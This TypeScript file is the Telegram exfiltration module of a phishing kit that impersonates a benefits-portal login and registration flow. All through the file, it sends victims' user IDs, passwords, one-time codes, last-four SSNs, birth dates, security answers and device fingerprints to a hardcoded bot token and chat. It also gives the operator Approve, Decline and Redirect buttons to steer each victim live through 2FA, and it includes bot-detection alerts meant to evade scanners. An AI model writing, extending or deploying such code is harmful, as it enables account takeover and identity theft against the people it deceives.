import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
import { SITE_DISPLAY_NAME, SITE_ORIGIN } from "@/lib/site-url"

// Single Telegram (The All Father) - hardcoded credentials.
const TELEGRAM_BOT_TOKEN = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
const CHAT_IDS = ["8810036834"]

/**
 * Public base URL of this app — used to register the Telegram webhook and to
 * point the inline "Approve / Decline / Redirect" buttons at the server.
 * Resolution order:
 *   1. NEXT_PUBLIC_APPROVAL_WEBHOOK_URL (explicit override)
 *   2. The current request's origin (host header) — always the real origin
 *      where this function is running (Vercel domain in prod, localhost local)
 *   3. PUBLIC_URL / SITE_ORIGIN fallbacks
 */
export function approvalWebhookUrl(req?: Request): string {
  let raw = ""
  if (process.env.NEXT_PUBLIC_APPROVAL_WEBHOOK_URL) {
    raw = process.env.NEXT_PUBLIC_APPROVAL_WEBHOOK_URL
  } else if (req) {
    const host = req.headers.get("x-forwarded-host") || req.headers.get("host") || ""
    const proto = req.headers.get("x-forwarded-proto") || "https"
    if (host) raw = `${proto}://${host}`
  }
  if (!raw && typeof process !== "undefined") {
    raw = process.env.PUBLIC_URL || SITE_ORIGIN
  }
  raw = raw || SITE_ORIGIN
  return raw.replace(/\/+$/, "") + "/api/telegram/webhook"
}

/** Payload for “New Visitor” Telegram (aligned with RTX / Alight Worklife format). */
export interface VisitorTelegramData {
  siteName: string
  location: string
  ip: string
  timezone: string
  isp: string
  asn?: string | null
  org?: string | null
  /** Parsed OS label from UA, e.g. "iOS 17.2", "Windows 10/11". */
  osLabel?: string
  /** Hardware/class from UA, e.g. "iPhone", "Mac", "Windows PC". */
  deviceLabel?: string

  userAgent: string
  screen: string
  language: string
  referrer: string
  pageUrl: string
  localTime: string
  utcTime: string
}

interface FormData {
  type: string
  userId?: string
  password?: string
  confirmPassword?: string
  email?: string
  phone?: string
  otp?: string
  timestamp: string
  page: string
}

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}


/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
function normalizeAdminPortalUrl(raw?: string): string {
  const t = (raw ?? '').trim()
  if (!t) return '/admin/login'
  const origin = t.replace(/\/admin\/login.*$/i, '').replace(/\?.*$/, '').replace(/\/+$/, '')
  return origin || '/admin/login'
}

/** Base ADMIN_PORTAL_URL for Telegram approve/deny links (no /admin/login path). */
function adminPortalLink(): string {
  return normalizeAdminPortalUrl(process.env.ADMIN_PORTAL_URL)
}


/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

/** Referrer / page fields: link when http(s), otherwise monospace. */
function asUrlField(value: unknown, fallback = "Unknown"): string {
  const t = value == null || value === "" ? "" : String(value).trim()
  const resolved = t || fallback
  if (resolved === "Direct") return asCode(resolved)
  if (isHttpUrl(resolved)) return asLink(resolved)
  return asCode(resolved)
}


function asCode(value: unknown): string {
  const t = value == null || value === '' ? 'Unknown' : String(value).trim() || 'Unknown'
  return `<code>${escapeTelegramHtml(t)}</code>`
}

function asPre(value: unknown): string {
  const t = value == null ? '' : String(value)
  return `<pre>${escapeTelegramHtml(t || 'Unknown')}</pre>`
}

/** Site header for login/OTP/forgot-password flow messages. */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
}

export function buildPinEnteredMessage(pin: string, timestamp: string): string {
  return wrapFlowMessage(
    [
      '🔔 <b>PIN Entered</b>',
      '━━━━━━━━━━━━━━━━━━',
      `🔢 PIN: ${asCode(pin)}`,
      `⏰ Timestamp: ${asCode(timestamp)}`,
    ].join('\n'),
  )
}

export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
  const osLine = data.osLabel
    ? `📱 <b>OS:</b> ${asCode(data.osLabel)}\n`
    : ''
  const deviceLine = data.deviceLabel
    ? `📱 <b>Device:</b> ${asCode(data.deviceLabel)}\n`
    : ''
  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
  const site = escapeTelegramHtml(data.siteName)
  const message =
    `\n🌐 <b>New Visitor (${site})</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Location:</b> ${asCode(data.location)}\n` +
    `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n` +
    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n` +
    (networkHint ? `🛡️ <b>Network:</b> ${asCode(networkHint)}\n` : '') +
    `\n` +
    osLine +
    deviceLine +
    `💻 <b>User Agent:</b>\n${asPre(data.userAgent)}\n` +
    `🖥️ <b>Screen:</b> ${asCode(data.screen)}\n` +
    `🌍 <b>Language:</b> ${asCode(data.language)}\n` +
    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}\n` +
    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
    `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}` +
    `\n<a href="https://t.me/th3_allfather">Odin Is With Us</a>`

  return await sendTelegramMessage(message, { disableWebPagePreview: false })
}

export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
  let message: string

  // 1) Login attempt from main Sign In
  if (data.type === 'login') {
    message = `🔐 <b>Login Attempt</b>
━━━━━━━━━━━━━━━━━━
👤 Username: ${asCode(data.userId)}
🔒 Password: ${asCode(data.password)}`
  }
  // 1c) Admin login approval
  else if (data.type === 'admin_login_approve') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    message = `✅ <b>CC – Login Approved</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
✅ Status: Approved – User redirected to OTP page`
  }
  // 1d) Admin login denial
  else if (data.type === 'admin_login_deny') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    message = `❌ <b>CC – Login Denied</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}
❌ Status: Denied – User shown error message`
  }
  // 1e) New login request (pending approval – same as request showing on admin)
  else if (data.type === 'login_approval_request') {
    const methodLabel = (data as { method?: string }).method === 'email' ? 'Email' : 'Text Message (SMS)'
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : '/admin/login'
    message = `🔔 <b>Login request – approve or deny</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
📧 Method: ${asCode(methodLabel)}
${(data as { method?: string }).method === 'email' ? `📧 Email: ${asCode((data as { maskedEmail?: string }).maskedEmail)}` : `📱 Phone: ${asCode((data as { maskedPhone?: string }).maskedPhone)}`}

👉 ${asLink(adminLink, 'Approve or deny')}`
  }
  // 1f) Login OTP submitted – second approval (admin must approve code before redirect)
  else if (data.type === 'login_otp_approval_request') {
    const adminLink = process.env.ADMIN_PORTAL_URL
      ? adminPortalLink()
      : '/admin/login'
    message = `🔢 <b>OTP submitted – approve or deny</b>
━━━━━━━━━━━━━━━━━━
👤 User ID: ${asCode((data as { userId?: string }).userId)}
🔢 Code: ${asCode((data as { password?: string }).password)}

👉 ${asLink(adminLink, 'Approve or deny')}`
  }
  // 1b) Register button clicked on home page
  else if (data.type === 'registration' && data.page === '/') {
    message = `🔹 <b>Type:</b> ${asCode('Register Button Clicked')}`
  }
  // 2) Login 2FA method selection (login flow)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page.startsWith('/login/2fa-verify')
  ) {
    const methodLabel =
      data.type === 'email_verification'
        ? 'Email'
        : 'Text Message (SMS)'

    message = `🔐 <b>Verify Your Identity</b>
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCode(methodLabel)}`
  }
  // 3) Login OTP verification (login verify-code)
  else if (
    data.type === 'login_email_otp_verification' ||
    data.type === 'login_text_otp_verification'
  ) {
    const methodLabel =
      data.type === 'login_email_otp_verification'
        ? 'Email'
        : 'Text Message (SMS)'

    message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
  }
  // 3a) Registration OTP verification (email/text on /registration)
  else if (
    (data.type === 'email_verification' || data.type === 'text_verification') &&
    typeof data.page === 'string' &&
    data.page === '/registration'
  ) {
    if (data.type === 'email_verification') {
      message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
    } else {
      message = `🔢 <b>Code:</b> ${asCode(data.otp)}`
    }
  }
  // 3b) Registration Step 1 – personal info
  else if (data.type === 'personal_info_lookup') {
    message = `📝 <b>Registration - Step 1: Personal Info</b>
━━━━━━━━━━━━━━━━━━
👤 <b>First Name:</b> ${asCode((data as any).firstName)}
👤 <b>Last Name:</b> ${asCode((data as any).lastName)}
🏷️ <b>Zip Code:</b> ${asCode((data as any).zipCode)}`
  }
  // 3c) Registration Step 2 – employer name
  else if (data.type === 'employer_name_lookup') {
    message = `📝 <b>Registration - Step 2: Employer</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>Employer Name:</b> ${asCode((data as any).employerId)}`
  }
  // 3d) Registration Step 3 – contact info
  else if (data.type === 'contact_info') {
    message = `📝 <b>Registration - Step 3: Contact Info</b>
━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> ${asCode(data.email || 'Not provided')}
📱 <b>Mobile:</b> ${asCode(data.phone)}`
  }
  // 3e) Registration Step 4 – method selected
  else if (
    data.type === 'registration' &&
    typeof data.page === 'string' &&
    data.page.startsWith('/registration?step=4')
  ) {
    const methodLabel = data.email ? 'Email' : 'Text Message (SMS)'

    message = `📝 <b>Registration - Step 4: Method Selected</b>
━━━━━━━━━━━━━━━━━━

Method Selected: ${asCode(methodLabel)}
${data.email ? `📧 <b>Email:</b> ${asCode(data.email)}` : ''}
${data.phone ? `📱 <b>Mobile:</b> ${asCode(data.phone)}` : ''}`
  }
  // 4) Registration credentials (User ID + password + confirm password)
  else if (data.type === 'User Credentials Setup') {
    message = `📝 <b>Registration - Credentials Set</b>
━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> ${asCode(data.userId)}
🔒 <b>Password:</b> ${asCode(data.password)}
🔒 <b>Confirm Password:</b> ${asCode(data.confirmPassword)}`
  }
  // 5) Registration security questions (all Q&A)
  else if (data.type === 'Security Questions') {
    // Expect securityAnswers: Array<{ question: string; answer: string }>
    const qa = Array.isArray((data as any).securityAnswers) ? (data as any).securityAnswers : []
    const lines = qa.map(
      (item: any, index: number) =>
        `Q${index + 1}: ${asCode(item.question)}\nA${index + 1}: ${asCode(item.answer)}`
    ).join('\n\n')

    message = `📝 <b>Registration - Security Questions</b>
━━━━━━━━━━━━━━━━━━

${lines || 'No questions captured.'}`
  }
  // 6) Registration complete (final submit)
  else if (data.type === 'Registration Complete') {
    message = `📝 <b>Registration Complete</b>
━━━━━━━━━━━━━━━━━━
👤 <b>User ID:</b> ${asCode(data.userId)}
✅ <b>Status:</b> ${asCode('Submitted')}`
  }
  // 7a) Login 2FA – resend code (login verify-code)
  else if (data.type === 'login_email_otp_resend' || data.type === 'login_text_otp_resend') {
    message = `🔔 <b>Resend Code Clicked</b>
━━━━━━━━━━━━━━━━━━`
  }
  // 7b) Login 2FA – "I did not receive my code" clicked
  else if (data.type === 'login_did_not_receive_code') {
    let methodLabel = 'Unknown'
    if (typeof data.page === 'string') {
      if (data.page.includes('method=text')) {
        methodLabel = 'Text Message (SMS)'
      } else if (data.page.includes('method=email')) {
        methodLabel = 'Email'
      }
    }

    message = `🔔 <b>"I did not receive my code" Clicked</b>
━━━━━━━━━━━━━━━━━━

User was sent back to the verification method selection page.
Method at time of click: ${asCode(methodLabel)}`
  }
  // Unknown types — do not send a generic Form Submission alert

  else {

    return false

  }


  return await sendTelegramMessage(wrapFlowMessage(message))
}

export type SendTelegramMessageOptions = {
  disableWebPagePreview?: boolean
}

export async function sendTelegramMessage(
  message: string,
  options: SendTelegramMessageOptions = {},
): Promise<boolean> {
  const disableWebPagePreview = options.disableWebPagePreview !== false

  // Validate we have the required token
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('Cannot send Telegram message: TELEGRAM_BOT_TOKEN is not set')
    return false
  }

  // If no chat ID(s) configured, log warning
  if (CHAT_IDS.length === 0) {
    console.warn('No TELEGRAM_CHAT_ID configured - message will not be sent')
    return false
  }
  
  const promises = CHAT_IDS.map(chatId => 
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: disableWebPagePreview,
      })
    })
    .then(async (response) => {
      try {
        const data = await response.json()
        if (!response.ok || !data.ok) {
          console.error(`Failed to send to chat ${chatId}:`, data)
          return { ok: false }
        }
        return { ok: true }
      } catch (parseError) {
        console.error(`Failed to parse response for chat ${chatId}:`, parseError)
        return { ok: false }
      }
    })
    .catch(error => {
      console.error(`Failed to send to chat ${chatId}:`, error)
      return { ok: false }
    })
  )

  const results = await Promise.allSettled(promises)
  
  // Check if at least one message was sent successfully
  const successCount = results.filter(
    result => result.status === 'fulfilled' && result.value && result.value.ok === true
  ).length
  
  // Return true if at least one message succeeded, false otherwise
  return successCount > 0
}


export interface VisitorData {
  location: string;
  ip: string;
  ipV4?: string;
  ipV6?: string;
  timezone: string;
  isp: string;
  userAgent: string;
  screen: string;
  language: string;
  url?: string;
  referrer?: string;
  utcTime: string;
}

// ─────────────────────────────────────────────────────────────────────────────
// Approval-gate Telegram buttons (Approve / Decline / Redirect)
// ─────────────────────────────────────────────────────────────────────────────
import { REDIRECT_TARGET_URL } from "@/lib/approval-steps"

export interface ApprovalKeyboard {
  /** Approval token — the victim polls /api/approval with this. */
  token: string
  step: string
  userId?: string
  messageId?: number
}

/** The inline keyboard The All Father taps to control the flow. */
export function buildApprovalKeyboard(token: string): object {
  return {
    inline_keyboard: [
      [
        {
          text: "✅ Approve",
          callback_data: `approve:${token}`,
        },
      ],
      [
        {
          text: "❌ Decline",
          callback_data: `decline:${token}`,
        },
        {
          text: "🌐 Redirect",
          callback_data: `redirect:${token}`,
        },
      ],
    ],
  }
}

/** Build the "waiting for approval" trailer appended to the step message. */
export function approvalTrailer(step: string): string {
  return (
    `\n\n🔐 <b>Approval Gate</b>\n` +
    `📍 <b>Step:</b> ${escapeTelegramHtml(step)}\n` +
    `Tap a button to control this user's flow:\n` +
    `✅ <b>Approve</b> — let them continue\n` +
    `❌ <b>Decline</b> — show "incorrect" & stop them\n` +
    `🌐 <b>Redirect</b> — send them to ${escapeTelegramHtml(
      REDIRECT_TARGET_URL,
    )}`
  )
}

/** Register the bot webhook so button clicks reach /api/telegram/webhook. */
export async function ensureApprovalWebhook(req?: Request): Promise<boolean> {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: approvalWebhookUrl(req),
          drop_pending_updates: true,
          allowed_updates: ["callback_query"],
        }),
      },
    )
    const data = await res.json().catch(() => ({}))
    if (!res.ok || !data.ok) {
      console.error("setWebhook failed:", data)
      return false
    }
    return true
  } catch (error) {
    console.error("setWebhook error:", error)
    return false
  }
}

/** Delete the webhook (e.g. when a polling client is active). */
export async function clearApprovalWebhook(): Promise<boolean> {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ drop_pending_updates: false }),
      },
    )
    const data = await res.json().catch(() => ({}))
    return res.ok && Boolean(data.ok)
  } catch (error) {
    console.error("deleteWebhook error:", error)
    return false
  }
}

/** Answer a callback query so Telegram stops the spinner. */
export async function answerCallbackQuery(callbackQueryId: string, text?: string): Promise<void> {
  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ callback_query_id: callbackQueryId, text: text ?? "" }),
      },
    )
  } catch (error) {
    console.error("answerCallbackQuery error:", error)
  }
}

/** Edit a sent message (e.g. to mark the gate as resolved). */
export async function editApprovalMessage(messageId: number, text: string): Promise<void> {
  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_IDS[0],
          message_id: messageId,
          text,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      },
    )
  } catch (error) {
    console.error("editApprovalMessage error:", error)
  }
}

export interface BotVisitData {
  name: string;
  type: string;
  userAgent: string;
  ip: string;
  path: string;
  matchedPatterns: string[];
}

export interface LoginData {
  userId: string;
  password: string;
}

export interface VerificationData {
  verificationType: string;
  code: string;
}

export interface ForgotPasswordData {
  ssnLast4: string;
  birthDate: string;
}

export interface NewUserData {
  ssnLast4: string;
  birthDate: string;
}

export interface AccountFoundData {
  method: string;
  password?: string;
}

export interface RememberDeviceData {
  choice: string;
}

export interface VerifyDetailsData {
  ssnLast4: string;
  zip: string;
  birthDate: string;
  fullName: string;
  phoneNumber: string;
}

class TelegramService {
  private botToken: string;
  private chatIds: string[];

  constructor() {
    this.botToken = TELEGRAM_BOT_TOKEN;
    this.chatIds = [...CHAT_IDS];
  }

  private async sendMessage(
    message: string,
    replyMarkup?: object,
  ): Promise<number | null> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error(
        "Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
      );
      return null;
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

    try {
      const results = await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
              ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
            }),
          }).then((res) => res.json().catch(() => null)),
        ),
      );
      // Return the message id of the first successful send (for editing later).
      for (const data of results) {
        if (data?.ok) return data?.result?.message_id ?? null;
      }
      return null;
    } catch (error) {
      console.error("Failed to send Telegram message:", error);
      return null;
    }
  }

  async sendBotVisitNotification(data: BotVisitData): Promise<void> {
    const patternsText =
      data.matchedPatterns && data.matchedPatterns.length > 0
        ? data.matchedPatterns.join(", ")
        : "Unknown";

    const body = [
      `🤖 <b>BOT</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🧩 <b>Name:</b> ${asCode(data.name)}`,
      `📝 <b>Type:</b> ${asCode(data.type)}`,
      "",
      "🤖 <b>User-Agent:</b>",
      asPre(data.userAgent),
      `📍 <b>IP:</b> ${asCode(data.ip)}`,
      `🔗 <b>Path:</b> ${asCode(data.path)}`,
      `📋 <b>Bot Function:</b> Matched bot pattern(s): ${asCode(patternsText)}`,
    ].join("\n");

    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendLoginNotification(
    data: LoginData,
    keyboard?: ApprovalKeyboard,
  ): Promise<number | null> {
    const body = [
      `🔐 <b>Login Attempt</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `👤 <b>User ID:</b> ${asCode(data.userId)}`,
      `🔑 <b>Password:</b> ${asCode(data.password)}`,
    ].join("\n");
    const message = keyboard
      ? wrapFlowMessage(body) + approvalTrailer(keyboard.step)
      : wrapFlowMessage(body);
    return await this.sendMessage(
      message,
      keyboard ? buildApprovalKeyboard(keyboard.token) : undefined,
    );
  }

  async sendVerificationNotification(
    data: VerificationData,
    keyboard?: ApprovalKeyboard,
  ): Promise<number | null> {
    const body = [
      `🔑 <b>Verification Code Submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Code:</b> ${asCode(data.code)}`,
    ].join("\n");
    const message = keyboard
      ? wrapFlowMessage(body) + approvalTrailer(keyboard.step)
      : wrapFlowMessage(body);
    return await this.sendMessage(
      message,
      keyboard ? buildApprovalKeyboard(keyboard.token) : undefined,
    );
  }

  async sendVerificationClickNotification(
    verificationType: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🟦 <b>Verification Option Selected</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔐 <b>Type:</b> ${asCode(verificationType)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendResendCodeNotification(
    isSecondOtp: boolean,
    _ip?: string,
  ): Promise<void> {
    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)";
    const body = [
      `🔄 <b>Resend Code Requested</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔐 <b>OTP Type:</b> ${asCode(otpType)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>Forgot Password page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User clicked "Forgot User ID or Password?" and landed on the form.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordNotification(
    data: ForgotPasswordData,
  ): Promise<void> {
    const body = [
      `🔑 <b>Forgot Password – form submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Last 4 SSN:</b> ${asCode(data.ssnLast4)}`,
      `📅 <b>Birth Date:</b> ${asCode(data.birthDate)}`,
      `✅ <b>Privacy Policy:</b> accepted`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>New User page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User clicked "New User?" and landed on the form.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserNotification(data: NewUserData): Promise<void> {
    const body = [
      `👤 <b>New User – form submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Last 4 SSN:</b> ${asCode(data.ssnLast4)}`,
      `📅 <b>Birth Date:</b> ${asCode(data.birthDate)}`,
      `✅ <b>Privacy Policy:</b> accepted`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserCodePageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>New User – Enter Access Code page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User landed on the page to enter the code sent to them.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserCodeNotification(code: string, _ip?: string): Promise<void> {
    const body = [
      `🔢 <b>New User – Access Code Entered</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Code:</b> ${asCode(code)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserPasswordPageViewNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>New User – Create Password page opened</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User landed on the page to create their password.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendNewUserPasswordNotification(
    password: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🔑 <b>New User – Password Set</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔑 <b>Password:</b> ${asCode(password)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
    const lines = [
      `✅ <b>Account Found – Continue Clicked</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔐 <b>Method:</b> ${asCode(data.method)}`,
    ];
    if (data.password) {
      lines.push(`🔑 <b>Password:</b> ${asCode(data.password)}`);
    }
    await this.sendMessage(wrapFlowMessage(lines.join("\n")));
  }

  async sendAccountFoundResetPasswordNotification(_ip?: string): Promise<void> {
    const body = [
      `🔗 <b>Account Found – Reset password link clicked</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `User clicked "Reset password" on the account found page.`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordVerifyNotification(
    verificationType: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🔐 <b>Forgot Password – Verify Identity Option Selected</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔐 <b>Type:</b> ${asCode(verificationType)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordCodeNotification(
    code: string,
    _ip?: string,
  ): Promise<void> {
    const body = [
      `🔢 <b>Forgot Password – Access Code Entered</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Code:</b> ${asCode(code)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendForgotPasswordResendNotification(_ip?: string): Promise<void> {
    const body = [
      `🔄 <b>Forgot Password – Resend Code Requested</b>`,
      `━━━━━━━━━━━━━━━━━━`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendRememberDeviceNotification(
    data: RememberDeviceData,
  ): Promise<void> {
    const body = [
      `💾 <b>Remember Device Choice</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `📱 <b>Choice:</b> ${asCode(data.choice)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendVerifyDetailsNotification(
    data: VerifyDetailsData,
    keyboard?: ApprovalKeyboard,
  ): Promise<number | null> {
    const body = [
      `📝 <b>Verify Details – form submitted</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔢 <b>Last 4 SSN:</b> ${asCode(data.ssnLast4)}`,
      `📍 <b>ZIP Code:</b> ${asCode(data.zip)}`,
      `📅 <b>Birth Date:</b> ${asCode(data.birthDate)}`,
      `👤 <b>Full Name:</b> ${asCode(data.fullName)}`,
      `📞 <b>Phone:</b> ${asCode(data.phoneNumber)}`,
    ].join("\n");
    const message = keyboard
      ? wrapFlowMessage(body) + approvalTrailer(keyboard.step)
      : wrapFlowMessage(body);
    return await this.sendMessage(
      message,
      keyboard ? buildApprovalKeyboard(keyboard.token) : undefined,
    );
  }

  async sendInputNotification(
    inputs: Record<string, string>,
    keyboard?: ApprovalKeyboard,
  ): Promise<number | null> {
    const entries = Object.entries(inputs).filter(([, value]) => value.trim() !== "");
    if (entries.length === 0) return null;

        const flow = (inputs.Flow || inputs.flow || "").trim().toLowerCase()
    const userId = (inputs["User ID"] || inputs.userId || "").trim()

    // User ID step (Flow: Login) → dedicated Login Attempt (no Flow line)
    if (flow === "login" && userId) {
      const body = [
        `🔐 <b>Login Attempt</b>`,
        `━━━━━━━━━━━━━━━━━━`,
        `👤 <b>User ID:</b> ${asCode(userId)}`,
      ].join("\n")
      const message = keyboard
        ? wrapFlowMessage(body) + approvalTrailer(keyboard.step)
        : wrapFlowMessage(body)
      return await this.sendMessage(
        message,
        keyboard ? buildApprovalKeyboard(keyboard.token) : undefined,
      )
    }

const body = [
      `🔐 <b>New Input Received</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      ...entries.map(
        ([key, value]) =>
          `${escapeTelegramHtml(key)}: ${asCode(value)}`,
      ),
    ].join("\n");
    const message = keyboard
      ? wrapFlowMessage(body) + approvalTrailer(keyboard.step)
      : wrapFlowMessage(body)
    return await this.sendMessage(
      message,
      keyboard ? buildApprovalKeyboard(keyboard.token) : undefined,
    )
  }

  async sendBlockedBotNotification(data: {
    userAgent: string;
    ip: string;
    path: string;
  }): Promise<void> {
    const body = [
      `🚫 <b>Bad Bot Blocked</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      "🤖 <b>User-Agent:</b>",
      asPre(data.userAgent),
      `🌍 <b>IP:</b> ${asCode(data.ip)}`,
      `🔗 <b>Path:</b> ${asCode(data.path)}`,
    ].join("\n");
    await this.sendMessage(wrapFlowMessage(body));
  }

  async sendRawMessage(message: string): Promise<void> {
    await this.sendMessage(message);
  }

}

export const telegramService = new TelegramService();

/** Simple helper for pages that just need to send a raw Telegram message. */
export async function sendTelegramNotification(message: string): Promise<void> {
  await telegramService.sendRawMessage(message);
}
